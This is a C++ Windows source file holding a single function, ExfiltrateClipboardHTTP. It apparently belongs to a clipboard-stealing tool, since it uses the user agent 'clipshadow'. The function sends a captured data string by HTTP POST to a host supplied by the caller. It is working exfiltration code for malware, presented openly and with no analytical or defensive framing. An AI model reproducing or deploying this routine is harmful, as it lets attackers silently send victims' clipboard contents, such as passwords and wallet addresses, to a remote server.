#include <windows.h>
#include <wininet.h>
#include <string>

/// @brief Sends string of data via HTTP POST
/// @param data the string to be sent
/// @param host the IP address to send data to
/// @param path the path/endpoint on the receiving machine (e.g /example.php)
/// @param port HTTP port (default = 80)
/// @return true if sent successfully, false otherwise 
bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string path, int port = 80)
{
    HINTERNET hSession = InternetOpenA("clipshadow", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(!hSession)
        return false;

    HINTERNET hConnect = InternetConnectA(hSession, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if(!hConnect)
    {
        InternetCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect, "POST", path.c_str(),
        NULL, NULL, NULL,
        INTERNET_FLAG_NO_CACHE_WRITE, 0
    );
    if(!hRequest) 
    {
        InternetCloseHandle(hSession);
        InternetCloseHandle(hConnect);
        return false;
    }

    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    std::string payload = "data=" + data;

    bool success = HttpSendRequestA(
        hRequest,
        headers, strlen(headers),
        (LPVOID)payload.c_str(),
        (DWORD)payload.size()
    );

    InternetCloseHandle(hSession);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);

    return success == TRUE;
}